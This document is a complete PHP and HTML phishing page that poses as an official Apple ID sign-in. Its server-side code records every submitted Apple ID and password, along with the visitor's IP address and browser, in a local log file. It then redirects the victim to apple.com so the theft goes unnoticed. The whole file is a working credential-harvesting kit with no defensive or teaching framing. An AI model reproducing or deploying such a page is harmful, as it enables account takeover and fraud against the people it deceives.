<?php
$log_dir = '../logs/apple';
if (!file_exists($log_dir)) mkdir($log_dir, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $entry = "════════════════════════════════════════════════\n";
    $entry .= "TIME: " . date('Y-m-d H:i:s') . "\n";
    $entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $entry .= "USER-AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $entry .= "APPLE_ID: $email\n";
    $entry .= "PASSWORD: $password\n";
    $entry .= "════════════════════════════════════════════════\n\n";
    
    file_put_contents("$log_dir/apple.log", $entry, FILE_APPEND | LOCK_EX);
    header('Location: https://apple.com');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple • Official</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #f5f5f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: white; border-radius: 18px; box-shadow: 0 20px 40px rgba(0,0,0,0.04); overflow: hidden; }
        .header { background: #000; color: white; padding: 24px; text-align: center; }
        .header h1 { font-size: 24px; font-weight: 600; margin-bottom: 4px; }
        .header p { color: #86868b; font-size: 14px; }
        .content { padding: 24px; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 14px; border: 2px solid #e8e8ed; border-radius: 12px; font-size: 15px; }
        .form-group input:focus { outline: none; border-color: #000; }
        .btn { width: 100%; padding: 14px; background: #000; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #333; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>Apple</h1>
                <p>Official Account</p>
            </div>
            <div class="content">
                <form method="POST">
                    <div class="form-group">
                        <input type="email" name="email" placeholder="Apple ID" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="btn">Sign in</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
